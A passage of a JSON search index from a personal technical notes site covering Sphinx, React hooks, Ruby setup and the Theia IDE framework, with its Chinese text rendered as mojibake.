ç¼–è¾‘å™¨é—®é¢˜","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-index.html","loc":"/yq-doc-source-docs-version-control-git-index.html"},{"title":"toctreeé€šé…ç¬¦å¤±æ•ˆ","text":"toctreeæœ‰ä¸€ä¸ªglobå±æ€§, éœ€è¦æŒ‡å®šæ‰å¯ä»¥ä½¿ç”¨é€šé…ç¬¦: .. toctree:: :glob: xxx/* å®˜æ–‡åŸæ–‡è¯´æ˜: You can use \"globbing\" in toctree directives, by giving the glob flag option. All entries are then matched against the list of available documents, and matches are inserted into the list alphabetically. Example: .. toctree:: :glob: intro* recipe/* * ä½¿ç”¨æ­¤å±æ€§, å°†åŒ¹é…, æŒ‰ç»“æœå­—æ¯é¡ºåºåˆ—å‡º.","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-question-TOCTREE-generals-failed.html","loc":"/yq-doc-source-docs-document-RST-mark-language-question-TOCTREE-generals-failed.html"},{"title":"ä¾¿æ·å¯åŠ¨æœåŠ¡","text":"ç›´æ¥è®¿é—®æ„å»ºå‡ºçš„HTMLæºç ä¸æ–¹ä¾¿, å¯ä»¥å¯åŠ¨ä¸€ä¸ªæœ¬åœ°HTTPæœåŠ¡: sphinx-autobuild source build/html æ³¨è§£ éœ€è¦å…ˆå®‰è£…: pip install sphinx-autobuild -i https://mirrors.aliyun.com/pypi/simple å‚è€ƒ: /docs/åç«¯/python/pythonä¸‰æ–¹åº“/sphinx-autobuild","tags":"æ–‡æ¡£","url":"/yq-doc-source-docs-document-RST-mark-language-question-Convenient-start--up-service.html","loc":"/yq-doc-source-docs-document-RST-mark-language-question-Convenient-start--up-service.html"},{"title":"DDD","text":"å¯¹DDDçš„ç†è§£ æœ€å¼€å§‹çš„MVCåªæ˜¯æŠ½è±¡å‡ºä¸€ä¸ªModelå®ä½“, åšORM; ä¸šåŠ¡å¤æ‚åº¦å †ç§¯åœ¨Serviceå±‚, å°†Serviceçš„ä¸šåŠ¡å®ç°æŠ½è±¡ä¸ºä¸€ä¸ªé€šç”¨çš„ \"é¢†åŸŸå¯¹è±¡\"(å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªç‰¹æ®Šçš„Model), å°±å«DDD","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-java-DDD.html","loc":"/yq-doc-source-docs-rear-end-java-DDD.html"},{"title":"sphinx-autobuild","text":"ä¸€ä¸ªç›´æ¥å°† Sphinx é¡¹ç›®å¯åŠ¨åœ¨æœ¬åœ°çš„æŒ‡ä»¤ å®‰è£…: pip install sphinx-autobuild -i https://mirrors.aliyun.com/pypi/simple å¯åŠ¨: sphinx-autobuild source build/html","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-sphinx-autobuild.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-sphinx-autobuild.html"},{"title":"Ruby","text":"å®‰è£…é…ç½® å®‰è£…: brew install ruby é…ç½®: ### # ruby ### # export PATH=\"/usr/local/opt/ruby/bin:$PATH\" # compilers to find ruby export LDFLAGS=\"-L/usr/local/opt/ruby/lib\" export CPPFLAGS=\"-I/usr/local/opt/ruby/include\" # pkg-config to find ruby export PKG_CONFIG_PATH=\"/usr/local/opt/ruby/lib/pkgconfig\" å†™åˆ° ~/.zshrc é…ç½®æº: # æŸ¥çœ‹å½“å‰æº gem source -l # ç§»é™¤ gem source --remove https://rubygems.org/ # æ·»åŠ å›½å†…é•œåƒ gem source -a https://gems.ruby-china.com/","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-ruby-index.html","loc":"/yq-doc-source-docs-rear-end-ruby-index.html"},{"title":"useRef","text":"ä»…æ”¯æŒå‡½æ•°ç»„ä»¶. ä¸ /docs/å‰ç«¯/æ¡†æ¶/react/hooks/createRef ä½¿ç”¨åŸºæœ¬ä¸€è‡´, åŒºåˆ«åœ¨äº: createRef æ¯æ¬¡æ¸²æŸ“éƒ½ä¼šè¿”å›ä¸€ä¸ªæ–°çš„å¼•ç”¨ï¼Œè€Œ useRef æ¯æ¬¡éƒ½ä¼šè¿”å›ç›¸åŒçš„å¼•ç”¨ã€‚ å®˜æ–¹æ–‡æ¡£å†…å®¹: useRef è¿”å›ä¸€ä¸ªå¯å˜çš„ ref å¯¹è±¡ï¼Œå…¶ .current å±æ€§è¢«åˆå§‹åŒ–ä¸ºä¼ å…¥çš„å‚æ•°ï¼ˆinitialValueï¼‰ã€‚è¿”å›çš„ ref å¯¹è±¡åœ¨ç»„ä»¶çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸå†…ä¿æŒä¸å˜ã€‚ æ¢å¥è¯è¯´, åœ¨ å‡½æ•°ç»„ä»¶ä¸­ , å½“è§¦å‘é‡æ–°æ¸²æŸ“æ—¶, ä½¿ç”¨ createRef å£°æ˜çš„å˜é‡, ä¼šå…ˆé”€æ¯(å˜é‡é‡ç½®ä¸ºnull), ç„¶åå†é‡æ–°èµ‹å€¼ ( åœ¨ç±»ç»„ä»¶ä¸­æ•ˆæœæ˜¯æ­£å¸¸çš„hook ) ä½¿ç”¨ useRef å£°æ˜çš„å˜é‡, ç¬¬ä¸€æ¬¡å£°æ˜åå°±ä¸€ç›´å­˜åœ¨. useRef é€‚ç”¨äºå‡½æ•°ç»„ä»¶ä¸­éœ€è¦åœ¨å¤šæ¬¡æ¸²æŸ“ä¹‹é—´ä¿æŒå¼•ç”¨çš„æƒ…å†µ. å‚è€ƒ:: ä»€ä¹ˆæ˜¯ useRef , useRef ä¸ createRef åŒºåˆ«, ä»¥åŠåœ¨ä»€ä¹ˆæƒ…å†µä¸‹ä½¿ç”¨ useRef ç²¾è¯»ã€ŠuseRef ä¸ createRef çš„åŒºåˆ«ã€‹ useRefã€createRefçš„åŒºåˆ«åŠä½¿ç”¨ï¼ŒåŠuseRefå¦™ç”¨","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-react-hooks-useref.html","loc":"/yq-doc-source-docs-front-end-frame-react-hooks-useref.html"},{"title":"è°ƒç”¨è‡ªå®šä¹‰å­å‡½æ•°ç»„ä»¶å±æ€§","text":"å…³é”®å­—:: React çˆ¶ç»„ä»¶è°ƒç”¨å­ç»„ä»¶ çˆ¶ç»„ä»¶è°ƒç”¨å­å‡½æ•°ç»„ä»¶ çˆ¶ç»„ä»¶è°ƒç”¨è‡ªå®šä¹‰å­å‡½æ•°ç»„ä»¶ è§ /docs/å‰ç«¯/æ¡†æ¶/react/hooks/useImperativeHandle çš„ React-Hook_ç»™éDOMå‡½æ•°ç»„ä»¶å¢åŠ refå±æ€§ /docs/å‰ç«¯/æ¡†æ¶/react/hooks/forwardRef /docs/å‰ç«¯/æ¡†æ¶/react/hooks/useImperativeHandle","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-react-question-Call-the-custom-sub--function-component-attribute.html","loc":"/yq-doc-source-docs-front-end-frame-react-question-Call-the-custom-sub--function-component-attribute.html"},{"title":"å‡½æ•°ç»„ä»¶æ— refå±æ€§","text":"å‡½æ•°ç»„ä»¶é»˜è®¤æ²¡æœ‰refå±æ€§, .. éœ€è¦ä½¿ç”¨forwardRefæ¥ä¼ é€’ref: éœ€è¦ä½¿ç”¨ forwardRef åŒ…è£…: const PSelect00 = (props: any, ref) => { return ( <div ref={ref}>p0</div> ) } const PSelect0 = React.forwardRef((props, ref) => { return ( <PSelect00 ref={ref}>p0</PSelect00> ) }) const PSelect1 = () => { const refP0 = React.useRef() return <PSelect0 ref={refP0}/> } è¿˜æœ‰å°±æ˜¯æš´éœ²è‡ªå®šä¹‰ç»„ä»¶å®ä¾‹, è‡ªå®šä¹‰æš´éœ²å†…å®¹, è§ /docs/å‰ç«¯/æ¡†æ¶/react/hooks/forwardRef /docs/å‰ç«¯/æ¡†æ¶/react/hooks/useImperativeHandle","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-react-question-Functional-component-no-REF-attribute.html","loc":"/yq-doc-source-docs-front-end-frame-react-question-Functional-component-no-REF-attribute.html"},{"title":"å…³äºvscodeçš„è¯­è¨€æœåŠ¡å™¨","text":"ä¸»è¦æ˜¯ä¸æ’ä»¶ç›¸å…³çš„å§. vscodeä¸ºäº†è§£å†³ä»¥ä¸‹é—®é¢˜: è¯­è¨€æœåŠ¡å™¨è‹¥è¦åŒæ—¶å…¼å®¹æ‰€æœ‰è¯­è¨€, å¤ªè¿‡è‡ƒè‚¿ æµªè´¹èµ„æº ä¸ç¼–è¾‘å™¨æ ‡å‡†ä¸ä¸€è‡´, å¯¼è‡´æ¯ä¸ªè¯­è¨€çš„æœåŠ¡å™¨éƒ½è¦é€‚é…ä¸€ç§ç¼–è¾‘å™¨ æ‰€æœ‰åˆ¶å®šäº†è¯­è¨€æœåŠ¡å™¨æ ‡å‡†åè®®LSP(Language Server Protocol), ä¿è¯äº† æ¯ä¸€ç§è¯­è¨€æœåŠ¡å™¨éƒ½èƒ½é€‚é…æ‰€æœ‰éµç…§æ­¤LSPæ ‡å‡†çš„ç¼–è¾‘å™¨ ç›¸å…³githubåœ°å€: https://github.com/Microsoft/vscode-languageserver-node åŸæ–‡ä»‹ç»: https://code.visualstudio.com/api/language-extensions/language-server-extension-guide#why-language-server å®ç°è‡ªå®šä¹‰çš„è¯­è¨€æœåŠ¡å™¨ ä¸»è¦ä¸¤ä¸ªæ–¹é¢: è¯­è¨€æœåŠ¡å™¨å®¢æˆ·ç«¯: éœ€è¦å®ç°vscodeçš„ç›¸åº”api è¯­è¨€æœåŠ¡å™¨æœåŠ¡ç«¯: å®é™…çš„è¯­æ³•åˆ†æ(å•ç‹¬çš„è¿›ç¨‹)","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-About-VSCode's-language-server.html","loc":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-About-VSCode's-language-server.html"},{"title":"theiaæºç ä¹‹user-storage","text":"æ³¨è§£ æ­¤æ–‡åŸºäº @theia ç‰ˆæœ¬ 1.43.1 æ­¤ç¯‡å¹…æ¶‰åŠåˆ°çš„æ˜¯theiaé…ç½®ç›¸å…³ æ¯”å¦‚ theia é»˜è®¤çš„é…ç½®ç›®å½•ä¸º: {å®¶ç›®å½•}/.theia é»˜è®¤é…ç½®-EnvVariablesServerImpl é»˜è®¤çš„ç¯å¢ƒé…ç½®ä¸º EnvVariablesServerImpl , æºç ä½ç½®: @theia/core/src/node/env-variables/env-variables-server.ts æºç å¾ˆç®€å•, è¿™é‡Œåªè¯´ä¸‹å®ƒåšäº†ä»€ä¹ˆ: å®ä¾‹åŒ–æ—¶å€™å°±é…ç½® configDirUri , ä¼˜å…ˆå°† process.env.THEIA_CONFIG_DIR (å³ç¯å¢ƒå˜é‡THEIA_CONFIG_DIR) è®¾ç½®ä¸ºé…ç½®æ ¹ç›®å½•; è‹¥ä¸å­˜åœ¨, å†å°† join(homedir(), '.theia') è®¾ç½®ä¸ºé…ç½®æ ¹; æˆ–è€…è¯´è®¾ç½®ä¸º configDirUri å…¶ä»–å°±æ˜¯å°†ç³»ç»Ÿä¼ å…¥çš„ç¯å¢ƒå˜é‡è§£æä¸‹, å¯ä»¥é€šè¿‡ getVariables() è·å– ç­‰... user-storageæ˜ å°„ å¦‚æœä½ æœ‰è·Ÿè¿‡theiaé¦–é€‰é¡¹ä¿å­˜çš„æ–­ç‚¹, å¾ˆå®¹æ˜“å°±å‘ç°, ä¿å­˜æ—¶å€™ä½¿ç”¨çš„ uri ä¸º: user-storage:/user/settings.json è¿™å®é™…ä¸Šæ˜¯ä¸€ä¸ªæŠ½è±¡çš„è™šæ‹Ÿæ˜ å°„è·¯å¾„, æ˜ å°„å…³ç³»å®šä¹‰åœ¨ UserStorageContribution , ä½ç½®: @theia/userstorage/src/browser/user-storage-contribution.ts å®ƒé€šè¿‡ é»˜è®¤é…ç½®-EnvVariablesServerImpl æä¾›çš„ configDirUri æ¥å®šä¹‰æ˜ å°„å…³ç³», æ¯”å¦‚: user-storage:/user/settings.json çš„é»˜è®¤æœ¬åœ°ç£ç›˜ä½ç½®ä¸º: {homedir}/.theia/settings.json createProvider æ˜¯å…·ä½“çš„å®ç°(åªæˆªå–å…³é”®éƒ¨åˆ†): uriConverter: { to: resource => { const relativePath = UserStorageUri.relative(resource); if (relativePath) { return configDirUri.resolve(relativePath).normalizePath(); } return undefined; }, from: resource => { const relativePath = configDirUri.relative(resource); if (relativePath) { return UserStorageUri.resolve(relativePath); } return undefined; } } å®Œ","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-Theia-source-code--User-Storage.html","loc":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-Theia-source-code--User-Storage.html"},{"title":"å…³äºtheiaçš„ç»‘å®š","text":"è‡ªå®šä¹‰æ‹“å±•å¯è§ /docs/å‰ç«¯/æ¡†æ¶/theia/é—®é¢˜/åˆ›å»ºè‡ªå®šä¹‰æ‹“å±• ä¸€èˆ¬æ¥è¯´, è‡ªå®šä¹‰æ‹“å±•éƒ½éœ€è¦åœ¨package.jsonå£°æ˜å…¥å£æ–‡ä»¶: \"theiaExtensions\": [ \"hello-world/lib/browser/hello-world-frontend-module\" ] å…¥å£æ–‡ä»¶å†…ä¸€èˆ¬éƒ½æ˜¯ç›¸åº”çš„ç»‘å®š: import { ContainerModule } from '@theia/core/shared/inversify'; export default new ContainerModule( (bind, unbind, isBound, rebind, unbindAsync, onActivation, onDeactivation) => { // add your contribution bindings here bind(CommandContribution).to(HelloWorldCommandContribution); bind(MenuContribution).to(HelloWorldMenuContribution); }); è¿™é‡Œä»‹ç»ä¸€ä¸‹ bind, unbind, rebind. rebind æ­¤å‰æ‰€æœ‰ç›¸åº”çš„ç»‘å®šçš†å¤±æ•ˆ, ä½†æ˜¯ä½œç”¨èŒƒå›´ä¿ç•™(å¦‚å•ä¾‹) unbind å–æ¶ˆæ­¤å‰æ‰€æœ‰çš„å“åº”ç»‘å®šåŠä½œç”¨èŒƒå›´ bind ç»‘å®šè´¡çŒ®ç‚¹, æœåŠ¡ç­‰ bind(A).toSelf() å¯¹è±¡å³è‡ªå·±, æ¯æ¬¡ä½¿ç”¨éƒ½æ˜¯ä¸€ä¸ªæ–°çš„å¯¹è±¡ bind(A).toSelf().inSingleScope() å•ä¾‹çš„ç»‘å®šè‡ªå·± bind(A).toService(B): æ³¨å…¥Aæ—¶, å®é™…æ˜¯ç±»Bçš„å¯¹è±¡, ç±»Bçš„å¯¹è±¡éœ€è¦æå‰bind","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-question-About-Theia-binding.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-About-Theia-binding.html"},{"title":"åœ¨theiaçš„react-dialogä¸Šæ–°å¢è‡ªå®šä¹‰dialog","text":"ä½¿ç”¨å¼€å‘è€…å·¥å…·å¯ä»¥çœ‹å‡º, theiaå†…ç½®çš„react-dialogæ˜¯å…ˆè¦†ç›–äº†ä¸€å±‚ z-index ä¸º 5000 çš„ div : æ³¨è§£ è¿™é‡Œçš„ react-dialog å³: import {ReactDialog} from \"@theia/core/lib/browser/dialogs/react-dialog\"; å¦‚æœè¦åœ¨å…¶ä¸Šå†å¼¹å‡ºä¸€ä¸ªdialog, è¦ä¹ˆ, å‡å°åŸæœ‰çš„è¿™ä¸ª 5000; è¦ä¹ˆ, å¢å¤§éœ€è¦å¢åŠ çš„ z-index","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-question-Added-custom-dialog-on-the-Dialog-of-Theia.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Added-custom-dialog-on-the-Dialog-of-Theia.html"},{"title":"å†…ç½®ä¸€äº›å¤–éƒ¨æ’ä»¶","text":"å¯ä»¥å»æ’ä»¶å•†åº—æœç´¢è·å–æ’ä»¶ä¸‹è½½åœ°å€: https://open-vsx.org ç„¶åè¡¥å……åˆ° package.json ä¸­, æ¯”å¦‚æˆ‘æœäº†cçš„è¯­æ³•åˆ†æçš„æ’ä»¶clang, é‚£ä¹ˆç›´æ¥åœ¨ theiaPlugins è¡¥å……å³å¯(è¿™é‡Œåç§°å¥½åƒæ²¡æœ‰å¼ºåˆ¶è¦æ±‚): \"theiaPlugins\": { \"vscode-clangd\": \"https://open-vsx.org/api/llvm-vs-code-extensions/vscode-clangd/0.1.24/file/llvm-vs-code-extensions.vscode-clangd-0.1.24.vsix\" } æ•ˆæœå°±æ˜¯å†…ç½®äº†è¿™ä¸ªæ’ä»¶, ä¸ä¼šåœ¨å¯åŠ¨åçš„æ’ä»¶å•†åº—æ˜¾ç¤º; åœ¨æ’ä»¶å•†åº—æœç´¢çš„ç»“æœæ˜¯æœªå®‰è£…; åœ¨æ’ä»¶å•†åº—æœç´¢åç‚¹å‡»å®‰è£…, ä¼šä¸‹è½½, ä½†æ˜¯å®‰è£…æ—¶æ£€æŸ¥åˆ°å·²ç»å†…ç½®, å°±ä¸ä¼šè§¦å‘è§£åŒ…å®‰è£…, ç„¶åæ˜¾ç¤ºå·²å®‰è£…(æ¥è‡ªAiçš„è§£é‡Š) æ³¨è§£ è¿™é‡Œè¡¥å……ä¸€ä¸‹, å®é™…ä¸Šæœ€æ ¸å¿ƒè¯­æ³•åˆ†æç­‰åŠŸèƒ½ä¾èµ–çš„çš„æ˜¯ç›¸åº” è¯­è¨€æœåŠ¡å™¨ çš„æ’ä»¶ è¯•è¿‡, åªæœ‰è¯­è¨€æœåŠ¡å™¨, ä¸åŒ…å« @theia/languages ä¹Ÿå¯ä»¥æ­£å¸¸ä»£ç è·³è½¬. å¦å¤–, å¦‚æœä½ æ–°åŠ å…¥ä¸€ä¸ªæ’ä»¶, ä¸”å·²ç»ä¸‹è½½è¿™ä¸ªæ’ä»¶çš„éƒ¨åˆ†ä¸œè¥¿, ä½†æ˜¯æ’ä»¶æœ‰é—®é¢˜, è¿™ä¸ªæ—¶å€™ä¸€èˆ¬ä¼šä¼´éšå‡ºç°ç¼–è¯‘æ„å»ºå¯åŠ¨æŠ¥é”™ç­‰ç­‰. æ­¤æ—¶ä¸ä»…è¦åˆ é™¤åœ¨ package.json å¢åŠ çš„æ’ä»¶é…ç½®, è¿˜éœ€è¦åˆ é™¤ plugins é‡Œç›¸åº”çš„ä¸‹è½½å†…å®¹. åŸå› å˜›, å¯åŠ¨çš„æ—¶å€™, ä¼šåŠ è½½ plugins ä¸‹çš„æ‰€æœ‰å†…å®¹","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-question-Built--in-external-plug--in.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Built--in-external-plug--in.html"},{"title":"å–æ¶ˆå¼‚æ­¥æ“ä½œ","text":"theiaæä¾›äº† CancellationTokenSource æ¥æ”¯æŒå–æ¶ˆå¼‚æ­¥æ“ä½œ ä½¿ç”¨ å¯¼åŒ…: import {CancellationTokenSource} from '@theia/core/lib/common' åˆ›å»ºä¸€ä¸ªå¯ä»¥ä¼ é€’çš„ CancellationToken å¯¹è±¡: const cts = new CancellationTokenSource(); const token = cts.token; åœ¨å¤–éƒ¨è°ƒç”¨ cancel() æ–¹æ³•æ¥é€šçŸ¥å·²å–æ¶ˆ: cts.cancel(); åœ¨å¼‚æ­¥æ“ä½œå†…éƒ¨ç›‘å¬ token çš„ä¿¡å·æ¥å¤„ç†å–æ¶ˆé€»è¾‘: doAsyncWork(token).then(...).catch(...); if (token.isCancellationRequested) { // è¿›è¡Œå–æ¶ˆæ“ä½œ } æ³¨è§£ å¤–éƒ¨è°ƒç”¨ cts.cancel(); æ—¶, å°†ä¼šå°† token.isCancellationRequested è®¾ç½®ä¸º true","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-question-Cancel-asynchronous-operation.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Cancel-asynchronous-operation.html"},{"title":"å®Œå…¨å…³é—­Theiaåº”ç”¨","text":"å¯¹ç”¨ä½¿ç”¨Electronçš„åç«¯, æ—§ç‰ˆæœ¬æ”¯æŒç›´æ¥è°ƒç”¨ app.quit é€€å‡º, æ–°ç‰ˆæœ¬ç¼–è¯‘çš„ç¨‹åºä¸æš´éœ²app, æ‰€ä»¥æ— æ³•ä½¿ç”¨æ­¤æ–¹æ³•. å¾…ç»­...","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-question-Completely-close-the-THEIA-application.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Completely-close-the-THEIA-application.html"},{"title":"ç»„ä»¶çš„çŠ¶æ€æ¸²æŸ“","text":"Theia è™½ç„¶æœ‰ä½¿ç”¨ react , ä¸è¿‡å´æ˜¯è‡ªå·±å¦å¤–å°è£…çš„æ§ä»¶, æ¯”è¾ƒå…¸å‹çš„å°±æ˜¯ \"@theia/core/src/browser/widgets/react-widgets\" å®šä¹‰çš„ ReactWidget . ä¸æ™®é€šçš„ react ç±»ç»„ä»¶ä¸åŒ, theiaä¸å­˜åœ¨è‡ªåŠ¨åˆ·æ–°æ§ä»¶çŠ¶æ€è¿™ç§æ¦‚å¿µ, å¦‚æœå…¶ä¸­å˜é‡æœ‰æ›´æ–°, éœ€è¦æ‰‹åŠ¨è°ƒç”¨ this,update() æ¥è§¦å‘UIæ¸²æŸ“çš„æ›´æ–°; ä½†æ˜¯ç«™åœ¨ç¼–ç è§’åº¦è€ƒè™‘, å¦‚æœæ¯ä¸€ä¸ªå˜é‡çš„æ›´æ–°éƒ½è°ƒç”¨ä¸€æ¬¡ this,update() é‡æ¸²æŸ“, æ˜¯ä¸€ä¸ªæ²¡å¿…è¦çš„å¼€é”€. ä¸€èˆ¬å»ºè®®æ˜¯å°†ä¸UIç›¸å…³çš„çŠ¶æ€ç»Ÿä¸€æ”¾åˆ°ä¸€ä¸ªä½ç½®, ç»Ÿä¸€æ›´æ–°, å¦‚: wStates = { state1: '', state2: '', ... } updateDataOfUi(newData) { this.wStates = newData this.update() } ä¸€èˆ¬å¯¹äºè¿™ç§æ›´æ–°æ˜¯å°† props ä¼ é€’ç»™å­ç»„ä»¶æ‰‹åŠ¨è§¦å‘å­ç»„ä»¶æ›´æ–°.","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-question-Component-status-rendering.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Component-status-rendering.html"},{"title":"æ§ä»¶çŠ¶æ€ä¿å­˜ä¸æ¢å¤","text":"ä¸€èˆ¬éƒ½æ˜¯å®ç° StatefulWidget çš„ storeState ä¸ restoreState , åŒ…ä½ç½®: import {StatefulWidget} from \"@theia/core/lib/browser\"; å¤§è‡´ä¾‹å­: class Example implements StatefulWidget{ storeState(): object { const argsExample = {his: this.history, name: this.name} return {argsExample} } restoreState(oldState: object): void { const lastArgs = oldState['argsExample'] || {} // do restore from these args this.restore(lastArgs) } restore(lastArgs){ // do restore from these args } } è¿™æ ·æ¯æ¬¡é‡æ–°æ‰“å¼€çš„æ—¶å€™, å°±å¯ä»¥è§¦å‘ç›¸åº”çš„æ¢å¤ æ³¨è§£ åªæœ‰theiaæ­£å¸¸å…³é—­çš„æ—¶å€™, çŠ¶æ€æ‰ä¼šè¢«æ­£å¸¸è®°å½•","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-question-Control-status-preservation-and-recovery.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Control-status-preservation-and-recovery.html"},{"title":"åˆ›å»ºè‡ªå®šä¹‰æ‹“å±•","text":"è¿™éƒ¨åˆ†å®˜æ–¹æ–‡æ¡£ä¹Ÿæœ‰è¯´æ˜: https://theia-ide.org/docs/authoring_extensions/ å¤§è‡´æµç¨‹å¦‚ä¸‹ å®‰è£…ç”Ÿæˆå™¨: npm install -g yo generator-theia-extension åˆ›å»ºæ‹“å±•ç›®å½•: mkdir -p src/@ide/theia-hello-world-extension è¿›åˆ›å»ºçš„ç›®å½•, ç”Ÿæˆç›¸å…³ä»£ç (è¿™é‡Œå¯åŠ¨ç”Ÿæˆå™¨çš„æ—¶å€™æœ‰å¾ˆå¤šé€‰é¡¹, æ¯”å¦‚æ§ä»¶, å®é™…ä½¿ç”¨é€‰éœ€è¦çš„å³å¯): cd src/@ide/theia-hello-world-extension yo theia-extension # è¿™é‡Œæ•™ç¨‹é€‰æ‹© 'Hello World' é€‰é¡¹(è¿™é‡Œé»˜è®¤) ç”Ÿæˆååœ¨å½“å‰ç›®å½•ç”Ÿæˆçš„ package.json é…ç½®æ–‡ä»¶å…¥å£: \"theiaExtensions\": [ { \"frontend\": \"lib/browser/hello-world-frontend-module\" } ] theiaExtensions é‡Œå®šä¹‰çš„æ¨¡å—å°±æ˜¯ç»‘å®šäº†theiaè´¡çŒ®ç‚¹çš„ä¾èµ–æ³¨å…¥çš„å†…å®¹(ç›¸å½“äºç‰¹æ®Šçš„å…¥å£æ–‡ä»¶) è¿™é‡Œæš‚æ—¶åªå®šä¹‰ frontend è´¡çŒ®ç‚¹, æœ‰éœ€è¦è¿˜å¯ä»¥å®šä¹‰åç«¯çš„ backend ä½¿ç”¨çš„ä¾èµ–æ³¨å…¥æ˜¯ InversifyJS æ¨¡å—æä¾›çš„ ContainerModule , ç”Ÿæˆå†…å®¹å¦‚ä¸‹(ç›®å½•: hello-world/lib/browser/hello-world-frontend-module ): /** * Generated using theia-extension-generator */ import { HelloWorldCommandContribution, HelloWorldMenuContribution } from './hello-world-contribution'; import { CommandContribution, MenuContribution } from '@theia/core/lib/common'; import { ContainerModule } from '@theia/core/shared/inversify'; export default new ContainerModule(bind => { // add your contribution bindings here bind(CommandContribution).to(HelloWorldCommandContribution); bind(MenuContribution).to(HelloWorldMenuContribution); }); ç›¸åº”çš„package.jsoné…ç½®å¤§è‡´å¦‚ä¸‹: { \"name\": \"@ide/hello-world-extension\", \"keywords\": [ \"theia-extension\" ], \"version\": \"0.1.0\", \"files\": [ \"hello-world/lib\", \"hello-world/src\" ], \"theiaExtensions\": [ { \"frontend\": \"hello-world/lib/browser/hello-world-frontend-module\" } ], \"dependencies\": { \"@theia/core\": \"latest\" }, \"private\": true, \"engines\": { \"yarn\": \">=1.7.0 <2\", \"node\": \">=14.18.0\" }, \"scripts\": { \"clean\": \"rimraf lib\", \"build\": \"tsc\", \"build:browser\": \"yarn --cwd browser-app bundle\", \"build:electron\": \"yarn --cwd electron-app bundle\", \"prepare\": \"lerna run prepare\", \"postinstall\": \"theia check:theia-version\", \"start:browser\": \"yarn --cwd browser-app start\", \"start:electron\": \"yarn --cwd electron-app start\", \"watch\": \"lerna run --parallel watch\" }, \"devDependencies\": { \"rimraf\": \"latest\", \"typescript\": \"latest\", \"lerna\": \"2.4.0\" }, \"workspaces\": [ \"hello-world\", \"browser-app\", \"electron-app\" ] } è¿™é‡Œç”Ÿæˆçš„ä½ç½®æ˜¯åœ¨ hello-world ä¸‹, åé¢æœ‰éœ€è¦å¯ä»¥é‡æ–°å¸ƒå±€ä¸€ä¸‹ç›®å½•, å½“ç„¶è¿˜æœ‰tsconfigé…ç½®. ä»£ç å¯ä»¥å‚è€ƒ hello-world/src ä¸‹çš„tsæºç . æ¥ä¸‹æ¥å°±æ˜¯å°†æ­¤æ‹“å±•æ”¾è¿›ideäº†, åœ¨ä¸»é¡¹ç›®çš„ package.json çš„ä¾èµ–ä¸­å¢åŠ å¦‚ä¸‹å†…å®¹: \"private\": true, \"dependencies\": { \"@ide/hello-world-extension\": \"0.1.0\" } \"workspaces\": [ \"src/@ide/*\" ], è¯´æ˜: åœ¨ä¾èµ–é‡Œé…ç½®ä¸Šé¢è‡ªå·±çš„æ‹“å±•, \"@ide/hello-world-extension\" å°±æ˜¯åœ¨è‡ªå®šä¹‰æ‹“å±•çš„ package.json å®šä¹‰çš„ name ç”±äºæ˜¯è‡ªå®šä¹‰æ‹“å±•, æ”¾åœ¨æœ¬åœ°ç›®å½•, éé•œåƒä»“åº“çš„npmåŒ…, æ‰€ä»¥éœ€è¦è®¾ç½® workspaces , æ‰èƒ½æ­£å¸¸è¯†åˆ«æœ¬åœ°æ¨¡å—å¹¶ç¼–è¯‘åˆ° node_module ä¸‹é¢å» åªæœ‰è®¾ç½®äº† private æ‰å¯ä»¥ä½¿ç”¨ workspaces ç„¶å yarn install å³å¯. æŒ‰ç…§ä¸Šé¢çš„æˆ‘è¿™é‡Œå¯åŠ¨çš„æ—¶å€™æ‰¾ä¸åˆ°æ¨¡å— vscode-ws-jsonrpc , ç„¶åå»æ ¹ç›®å½•è£…äº†ä¸€ä¸ª(å¯èƒ½éœ€è¦åŠ -W): yarn add vscode-ws-jsonrpc --save æ³¨æ„ç‰ˆæœ¬, å‘ç°è™½ç„¶æˆ‘çš„ theia/languages æ˜¯æœ€æ–°æ–°ç‰ˆ: \"@theia/languages\": \"latest\" ä½†æ˜¯ä¾èµ–çš„ vscode-ws-jsonrpc æ˜¯ 0.2.0 , å¯ç°åœ¨(2023.09.14) 2.x.x éƒ½æœ‰äº†: \"vscode-ws-jsonrpc\": \"&#94;0.2.0\" æ³¨è§£ æ²¡é—®é¢˜ å¦‚æœæƒ³å¼€æ”¾çš„è¯, ä¹Ÿå¯ä»¥ yarn push å‘å¸ƒåˆ°å®˜æ–¹çš„é•œåƒä»“åº“.","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-question-Create-custom-expansion.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Create-custom-expansion.html"},{"title":"ä¾èµ–æ³¨å…¥ä½¿ç”¨ä»¥åŠé—®é¢˜","text":"ä¾èµ–æ³¨å…¥, ç°åœ¨ä½¿ç”¨æ˜¯å¾ˆæ™®é. åœ¨ theia 